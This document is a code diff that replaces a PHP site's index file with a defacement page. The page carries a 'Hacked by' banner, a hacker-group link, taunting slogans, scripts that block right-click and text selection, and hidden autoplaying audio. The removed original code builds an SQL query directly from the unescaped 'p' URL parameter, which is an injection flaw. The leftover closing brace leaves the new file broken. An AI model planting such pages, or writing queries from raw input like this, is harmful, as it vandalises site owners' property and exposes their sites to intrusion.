@@ -1,31 +1,49 @@
-<?php
+<title>Hacked by *AmaZiMustafa Polat
+<body bgcolor="Black" />
+<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false"></body>
+<**** name="description" content="This Site has been Hacked by *AmaZinG*!" />
+<img align="left" src="http://i564.photobucket.com/albums/ss87/Mafya_67/zix0zc.png" />
+<img align="right" src="http://i564.photobucket.com/albums/ss87/Mafya_67/66da48.png" />
+<center><img src="http://i564.photobucket.com/albums/ss87/Mafya_67/logo.png" /></center>
+<br />
+<script type="text/javascript">
 
-require('hsr-config.php'); 
+var texte=new Array ();
+texte[0]="http://www.turkhackteam.net";
+texte[1]="Ya Kan Kustururum<br />Yada Tam Sustururum!";
+texte[2]="Benden ders almayanlar,<br />Aleme ders konusu olur.";
+var geschwindigkeit=2000;
+var a=0;
 
-
-if (!is_alum_installed()) {
-	header("Location: hsr-admin/install.php");
-	exit();
+function text_wechsel ()
+{
+if (window.********.getElementById)
+{
+window.********.getElementById ("textfeld").innerHTML=texte[a];
+if ((a+1)<texte.length)
+{
+a++;
+}
+else
+{
+a=0;
+}
+window.setTimeout ("text_wechsel ()",geschwindigkeit);
+}
 }
 
-$query = "SELECT * FROM options WHERE option_name = 'theme'";
-$result = mysql_query($query);
-while ($row = mysql_fetch_array($result)) {
-	$theme = $row['option_value'];
-	}
+window.onload=text_wechsel;
 
-if (isset($_GET['p'])) {
-	$p = $_GET['p'];
-$include = "hsr-content/themes/".$theme."/page.php";
-	include($include);
-	
-	$query = "SELECT * FROM posts WHERE id = '$p' LIMIT 1";
-	$result = mysql_query($query);
-		
-} else {
+</script>
+<div align="center" id="textfeld" style="font-family:Courier New,Arial,Verdana,Tahoma,helvetica,sans-serif,Times New Roman;font-size:25pt;color:red">
+</div>
+<br /><br />
+<div style="text-align: center; "><span class="Apple-style-span" style="color: rgb(255, 255, 255); font-family: Arial, Tahoma, Verdana; font-size: 20px; font-weight: bold; ">Sorry Admin, The Game is 0ver!</span></div>
+<center><img src="http://i297.photobucket.com/albums/mm234/DonTomika/cmd.gif" /></center>
+<br />
+<center><img src="http://e1205.hizliresim.com/x/j/5z8sq.jpg" /></center>
+<EMBED src="http://uploads3.mp3songurls.com/1223303.mp3" width=0 height=0 type=audio/mpeg loop="true" autostart="true"></embed>
 
-	$include = "hsr-content/themes/".$theme."/index.php";
-	include($include);
 
 }
 ?>
